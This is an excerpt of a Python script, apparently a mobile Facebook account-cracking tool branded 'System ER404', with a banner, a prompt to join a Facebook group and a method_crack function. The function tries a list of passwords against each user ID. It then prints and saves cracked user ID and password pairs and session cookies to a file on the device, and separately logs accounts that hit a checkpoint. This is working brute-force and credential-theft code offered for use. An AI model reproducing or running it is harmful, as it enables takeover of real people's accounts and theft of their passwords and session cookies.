...
os.system('xdg-open https://www.facebook.com/groups/540136494232116/?ref=share_group_link')
#-------------color----------------#
...
Yb        dP    db    88b 88 888888 888888 8888b.  
 Yb  db  dP    dPYb   88Yb88   88   88__    8I  Yb 
  YbdPYbdP    dP__Yb  88 Y88   88   88""    8I  dY 
   YP  YP    dP""""Yb 88  Y8   88   888888 8888Y"  

>>>>>Tools Edited By System ER404<<<<<<<           
''')
...
def TARA_LOVE():
    ...
    print(f'{B} [{warna}02{B}] \33[0;42mJOIN FB GROUP\033[0;92m ')
...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[SCANNING] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[404-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;37m [COOKIE-🌸] '+coki)
                    open('/sdcard/404-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;35m[404-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/404-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
